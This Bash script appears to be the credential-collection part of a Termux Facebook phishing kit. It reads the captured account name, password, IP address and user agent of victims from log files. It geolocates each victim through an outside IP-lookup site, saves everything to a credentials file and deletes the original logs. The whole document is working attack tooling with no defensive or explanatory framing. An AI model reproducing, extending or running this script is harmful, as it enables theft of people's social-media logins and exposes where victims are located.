#!/bin/bash

TMP_PATH=/data/data/com.termux/files/usr/var/service/php/facebook/

IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r')
ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d ":" -f2)
UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2)
IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
CONTINENT=$(grep -o 'Continent.*' $TMP_PATH/iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
COUNTRY=$(grep -o 'Country:.*' $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
HOSTIP=$(grep  -o "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
REVERSE_DNS=$(grep -a "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f1)
ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
AS_NUMBER=$(grep -o "AS Number:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
select CREDS in Actually Saved Exit ; do
	case "$CREDS" in
		Actually)
			if [ ! -e $TMP_PATH/creds.txt ]; then
				touch $TMP_PATH/creds.txt
			fi
			exec date >> $TMP_PATH/creds.txt
			if [ -e $TMP_PATH/ip.txt ] && [ -e $TMP_PATH/usernames.txt ] && [ -e $TMP_PATH/iptracker.log ]; then
				echo $IP >> $TMP_PATH/creds.txt
				echo $IP_SPEED >> $TMP_PATH/creds.txt
				echo $IP_CURRENCY >> $TMP_PATH/creds.txt
				echo $CONTINENT >> $TMP_PATH/creds.txt
				echo $COUNTRY >> $TMP_PATH/creds.txt
				echo $STATE >> $TMP_PATH/creds.txt
				echo $CITY >> $TMP_PATH/creds.txt
				echo $HOSTIP  >> $TMP_PATH/creds.txt
				echo $REVERSE_DNS >> $TMP_PATH/creds.txt
				echo $ACCOUNT >> $TMP_PATH/creds.txt
				echo $PASSWD >> $TMP_PATH/creds.txt
				echo $UA >> $TMP_PATH/creds.txt
				echo $ISP >> $TMP_PATH/creds.txt
				echo $AS_NUMBER >> $TMP_PATH/creds.txt
				
				printf "$G[+]-> IP:$W\t$IP"
				printf "$G[+]-> IP SPEED:$W\t$IP_SPEED"
				printf "$G[+]-> IP CURRENCY:$W\t$IP_CURRENCY"
				printf "$G[+]-> CONTINENT:$W\t$CONTINENT"
				printf "$G[+]-> COUNTRY:$W\t$COUNTRY"
				printf "$G[+]-> STATE:$W\t$STATE"
				printf "$G[+]-> HOST IP:$W\t$HOSTIP"
				printf "$G[+]-> REVERSE DNS:$W\t$REVERS_DNS"
				printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
				printf "$G[+]-> PASSWORD:$W\t$PASSWD"
				printf "$G[+]-> USER AGENT:$W\t$UA"
				printf "$G[+]-> ISP:$W\t$ISP"
				printf "$G[+]-> AS NUMBER:$W\t$AS_NUMBER"
				
				for FILE in ip.txt usernames.txt iptracker.log ; do
					rm $TMP_PATH/$FILE > /dev/null 2>&1
				done
			else
				printf "$R[w]->$W There are not credentials yet\n"
			fi
			;;
		Saved)
			if [ -e $TMP_PATH/creds.txt ]; then
				cat $TMP_PATH/creds.txt
			else
				printf "$R[w]->$W There are not credentials saved\n"
			fi
			;;
		Exit)
			break
			;;
	esac
done
